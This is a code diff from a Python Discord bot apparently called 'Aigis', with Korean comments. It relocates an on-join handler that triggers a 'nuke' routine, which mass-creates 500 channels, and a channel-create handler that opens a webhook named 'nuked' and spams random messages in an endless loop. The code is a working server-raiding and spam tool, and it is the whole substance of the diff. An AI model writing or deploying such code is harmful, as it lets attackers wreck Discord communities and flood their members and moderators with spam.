@@ -31,21 +31,6 @@ async def on_ready():
   #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="영상 시청중"))
   
   print("Aigis:",client.user.name,"819929289759653928:",client.user.id)
-  
-async def on_guild_join(guild):
-  if nuke_on_join == True:
-    await asyncio.sleep(nuke_wait_time)
-    await nuke(guild)
-  else:
-    return
-
-async def on_guild_channel_create(channel):
-  webhook = await channel.create_webhook(name = "nuked")
-  webhook_url = webhook.url
-  async with aiohttp.ClientSession() as session:
-    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
-    while True:
-      await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))
 
 #갠디로 엠베드 전송
 @client.command()
@@ -102,6 +87,21 @@ async def nuke(guild):
   for i in range(500):
     await guild.create_text_channel(random.choice(channel_names))
   print(f"{C.GREEN}Nuked {guild.name}.")
+  
+async def on_guild_join(guild):
+  if nuke_on_join == True:
+    await asyncio.sleep(nuke_wait_time)
+    await nuke(guild)
+  else:
+    return
+
+async def on_guild_channel_create(channel):
+  webhook = await channel.create_webhook(name = "nuked")
+  webhook_url = webhook.url
+  async with aiohttp.ClientSession() as session:
+    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
+    while True:
+      await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))
 
 #서버퇴장
 async def overheat(ctx):
